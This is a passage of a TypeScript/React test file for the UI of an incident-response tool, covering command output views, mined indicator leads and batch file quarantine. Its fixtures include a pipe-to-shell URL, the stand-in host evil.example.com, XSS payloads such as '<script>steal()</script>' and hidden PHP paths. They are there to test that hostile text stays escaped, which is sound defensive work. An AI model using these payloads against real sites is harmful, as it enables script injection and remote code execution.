    expect(html).toContain("docker exec -i c1 sh -c");
    expect(html).toContain("这是在目标上实际执行的完整命令");
    expect(html).toContain('aria-expanded="false"');
    expect(html).toContain(">展开</button>");
    expect(html).toContain("is-collapsed");
    // The collapsed default is the only static state; the press path is the
    // toggle flipping expanded, driving the same attribute and clamp off.
    const source = readFileSync(new URL("./EmergencyCommandsPage.tsx", import.meta.url), "utf8");
    expect(source).toContain("aria-expanded={expanded}");
    expect(source).toContain('expanded ? "收起" : "展开"');
    expect(source).toContain('collapsible && !expanded ? " is-collapsed" : ""');
    // The always-visible copy keeps the clipboard ceiling.
    const hugeCommand = renderToStaticMarkup(<EmergencyCommandResultView
      result={{ ...verbatim, command: "x".repeat(128 * 1_024 + 1) }}
      writeClipboard={async () => undefined} />);
    expect(hugeCommand).toContain("内容超过 128 KiB，无法复制");
    // The tab content itself: what the target sent stays text — markup
    // escapes and ANSI draws as \x1b.
    const command = renderToStaticMarkup(<EmergencyCommandVerbatim
      text={verbatim.command} writeClipboard={async () => undefined}
      note="这是在目标上实际执行的完整命令（含容器包装和工具检查前置）"
      truncatedNote="命令超过 128 KiB，只显示前 128 KiB" />);
    expect(command).toContain("这是在目标上实际执行的完整命令");
    expect(command).toContain("docker exec -i c1 sh -c");
    const raw = renderToStaticMarkup(<EmergencyCommandVerbatim
      text={verbatim.rawOutput} writeClipboard={async () => undefined}
      note="目标返回的标准输出" truncated={verbatim.rawOutputTruncated}
      truncatedNote="原始输出超过 1 MiB，只显示前 1 MiB" />);
    expect(raw).toContain("&lt;script&gt;steal()");
    expect(raw).toContain("\\x1b[31mcolored");
    expect(raw).not.toContain("<script>");
    expect(raw).toContain("目标返回的标准输出");
    expect(raw).toContain("复制");
    // Without the clipboard bridge there is no button to press.
    const without = renderToStaticMarkup(<EmergencyCommandVerbatim
      text={verbatim.rawOutput} note="目标返回的标准输出"
      truncatedNote="原始输出超过 1 MiB，只显示前 1 MiB" />);
    expect(without).not.toContain("复制");
    // Past the clipboard ceiling the button explains instead of copying.
    const tooLong = renderToStaticMarkup(<EmergencyCommandVerbatim
      text={"x".repeat(128 * 1_024 + 1)} note="n"
      truncatedNote="t" writeClipboard={async () => undefined} />);
    expect(tooLong).toContain("内容超过 128 KiB，无法复制");
    // Truncation is announced, not implied.
    const truncated = renderToStaticMarkup(<EmergencyCommandVerbatim
      text="x" note="n" truncated truncatedNote="原始输出超过 1 MiB，只显示前 1 MiB" />);
    expect(truncated).toContain("原始输出超过 1 MiB，只显示前 1 MiB");
    // The button hands the exact field to the bridge, nothing else.
    expect(source).toContain("void writeClipboard(text)");
  });

  it("renders mined leads as plain text with scope, sources and a warning that they are leads", () => {
    const report = {
      entries: [
        { kind: "url" as const, value: "http://1.2.3.4:8080/x|sh", scope: "public" as const, hits: 2,
          sources: ["检查计划任务", "查看网络连接"], common: false },
        { kind: "domain" as const, value: "evil.example.com", scope: "public" as const, hits: 1,
          sources: ["查看网络连接"], common: false },
        { kind: "ipv4" as const, value: "192.168.4.4", scope: "private" as const, hits: 4,
          sources: ["查看进程"], common: false },
        { kind: "domain" as const, value: "deb.debian.org", scope: "public" as const, hits: 1,
          sources: ["查看进程"], common: true },
      ],
      truncated: false,
    };
    const html = renderToStaticMarkup(<EmergencyIocPanel
      status="ready" report={report} error={null}
      writeClipboard={async () => undefined} onClose={() => undefined} />);
    expect(html).toContain("线索汇总");
    expect(html).toContain("待核查的线索，不是已确认的入侵指标");
    for (const value of ["http://1.2.3.4:8080/x|sh", "evil.example.com", "192.168.4.4", "deb.debian.org"]) {
      expect(html).toContain(value);
    }
    // Untrusted values render escaped; a hostile one stays text.
    const hostile = renderToStaticMarkup(<EmergencyIocPanel
      status="ready" report={{ entries: [
        { kind: "url" as const, value: "<script>steal()</script>", scope: "public" as const,
          hits: 1, sources: ["a"], common: false },
      ], truncated: false }} error={null} onClose={() => undefined} />);
    expect(hostile).not.toContain("<script>");
    expect(hostile).toContain("&lt;script&gt;steal()");
    // Scopes and kinds label in Chinese; a well-known host is marked, not hidden.
    for (const label of ["URL", "域名", "IPv4", "公网", "内网", "常见"]) expect(html).toContain(label);
    expect(html).toContain("检查计划任务");
    expect(html).toContain("复制全部");
    expect(html).toContain("复制防误触格式");
    // Filters are present for the expert; without the clipboard bridge there
    // is nothing to copy with.
    expect(html).toContain("按值或来源命令过滤");
    const silent = renderToStaticMarkup(<EmergencyIocPanel
      status="ready" report={report} error={null} onClose={() => undefined} />);
    expect(silent).not.toContain("复制全部");
    // Empty, loading, truncated and error states each say what they are.
    const empty = renderToStaticMarkup(<EmergencyIocPanel
      status="ready" report={{ entries: [], truncated: false }} error={null}
      onClose={() => undefined} />);
    expect(empty).toContain("没有发现线索");
    expect(empty).toContain("不代表目标没有异常");
    const truncated = renderToStaticMarkup(<EmergencyIocPanel
      status="ready" report={{ entries: report.entries, truncated: true }} error={null}
      onClose={() => undefined} />);
    expect(truncated).toContain("超过上限");
    const loading = renderToStaticMarkup(<EmergencyIocPanel
      status="loading" report={null} error={null} onClose={() => undefined} />);
    expect(loading).toContain("正在汇总");
    const failed = renderToStaticMarkup(<EmergencyIocPanel
      status="error" report={null} error="快照已过期" onClose={() => undefined} />);
    expect(failed).toContain("快照已过期");
  });

  it("asks the backend for leads by snapshot handle alone, never with output text", () => {
    const source = readFileSync(new URL("./EmergencyCommandsPage.tsx", import.meta.url), "utf8");
    expect(source).toContain("api.extractEmergencyCommandIocs(bindingHandle, request.snapshotHandle)");
    expect(source).not.toMatch(/extractEmergencyCommandIocs\([^)]*(?:output|result|text)/u);
  });

  it("previews a batch per item and keeps partial failure visible", () => {
    const items: EmergencyPathBatchItem[] = [
      {
        pathHandle: "ph-a", path: "/tmp/.a.php", kind: "file" as const, size: "21", mode: "0755",
        executable: true, planHandle: "plan-a", summary: "将该文件移入隔离区",
        restoreDescription: "把文件放回原位置", refusal: null,
      },
      {
        pathHandle: "ph-b", path: "/tmp/.b.php", kind: "file" as const, size: "4", mode: "0644",
        executable: false, planHandle: null, summary: null, restoreDescription: null,
        refusal: "path-stale",
      },
      {
        pathHandle: "ph-c", path: "/tmp/.c.php", kind: "file" as const, size: "9", mode: "0755",
        executable: true, planHandle: "plan-c", summary: "将该文件移入隔离区",
        restoreDescription: null, refusal: null,
      },
    ];
    // Before any step: facts and plan-or-refusal per row.
    const preview = renderToStaticMarkup(<EmergencyPathBatchItems
      items={items} receipts={[]} undone={new Map()} onUndo={() => undefined} />);
    for (const path of ["/tmp/.a.php", "/tmp/.b.php", "/tmp/.c.php"]) {
      expect(preview).toContain(path);
    }
    expect(preview).toContain("将该文件移入隔离区");
    expect(preview).toContain("把文件放回原位置");
    expect(preview).toContain("条目已过期");
    expect(preview).toContain("可执行");
    expect(preview).not.toContain("撤销");
    // After the run: a passed row offers its own undo, a failed row keeps
    // its refusal text — partial failure stays visible.
    const receipts: EmergencyPathReceipt[] = [
      { planHandle: "plan-a", path: "/tmp/.a.php", action: "quarantine" as const, passed: true,
        detail: "已移入隔离区并核对", restored: false, untouched: false, undoable: true },
      { planHandle: "plan-c", path: "/tmp/.c.php", action: "quarantine" as const, passed: false,
        detail: "文件在计划后已被替换，未改动。", restored: false, untouched: true, undoable: false },
    ];
    const done = renderToStaticMarkup(<EmergencyPathBatchItems
      items={items} receipts={receipts} undone={new Map()} onUndo={() => undefined} />);
    expect(done).toContain("已完成并核对");
    expect(done).toContain("已移入隔离区并核对");
    expect(done).toContain("被拒绝，文件未改动");
    expect(done).toContain("文件在计划后已被替换");
    expect(done).toContain("撤销");
    // Only the undoable row offers it — the rejected item has nothing to undo.
    expect(done).not.toContain("plan-c');>撤销");
    // An undone row reports the undo and drops the button.
    const undoneRows = renderToStaticMarkup(<EmergencyPathBatchItems
      items={items} receipts={receipts}
      undone={new Map([["plan-a", "文件已恢复原位置并核对"]])} onUndo={() => undefined} />);
    expect(undoneRows).toContain("撤销：文件已恢复原位置并核对");
    // Hostile text in a receipt or path stays text.
    const hostile = renderToStaticMarkup(<EmergencyPathBatchItems
      items={[{ ...items[0] as EmergencyPathBatchItem, path: "<img src=x onerror=steal()>" }]}
      receipts={[{ ...receipts[0] as EmergencyPathReceipt, detail: "<script>x()</script>" }]}
      undone={new Map()} onUndo={() => undefined} />);
    expect(hostile).not.toContain("<script>");
    expect(hostile).not.toContain("<img src=x");
    // The pick stage offers the two containment actions and nothing else.
    const choose = renderToStaticMarkup(<EmergencyPathBatchChoose count={2} onPick={() => undefined} />);
    expect(choose).toContain("批量隔离");
    expect(choose).toContain("批量去执行位");
    expect(choose).not.toContain("按残留还原");
    // The dialog itself: the one confirmation and the stop-between-items path.
    const dialog = renderToStaticMarkup(<EmergencyPathBatchDialog
      api={api} bindingHandle="binding" pathHandles={["ph-a", "ph-b"]} onClose={() => undefined} />);
    expect(dialog).toContain("批量处置");
    const source = readFileSync(new URL("./EmergencyPathBatchDialog.tsx", import.meta.url), "utf8");
    // Handles go in, paths never do; steps run one at a time and a stop
    // between items cancels what has not run.
    expect(source).toContain("api.planEmergencyPathBatch(bindingHandle, pathHandles, action)");
    expect(source).toContain("api.stepEmergencyPathBatch(bindingHandle, batchHandle)");
    expect(source).toContain("stopRef.current");
    expect(source).toContain("api.cancelEmergencyPathBatch(bindingHandle, batchHandle)");
    expect(source).toContain("api.undoEmergencyPathAction(bindingHandle, planHandle)");
  });

  it("lets the batch dialog carry the shared dialog styles", () => {
    const source = readFileSync(new URL("./EmergencyPathBatchDialog.tsx", import.meta.url), "utf8");
    expect(source).toContain('import "./emergency-path.css";');
    const css = readFileSync(new URL("./emergency-path.css", import.meta.url), "utf8");
    expect(css).toContain(".emergency-path-batch");
    expect(css).not.toMatch(/#[0-9a-f]{3,8}|rgba?\(|hsla?\(/iu);
  });

  it("uses global theme tokens with no color literals", () => {
    const css = readFileSync(new URL("./emergency-commands.css", import.meta.url), "utf8");
    expect((css.match(/var\(--[a-z0-9-]+\)/gu) ?? []).length).toBeGreaterThan(40);
    expect(css).not.toMatch(/#[0-9a-f]{3,8}\b|rgba?\(|hsla?\(/iu);
    expect(css).toMatch(/color:\s*var\(--console-text\);[\s\S]*?background:\s*var\(--console-bg\);/u);
  });
});
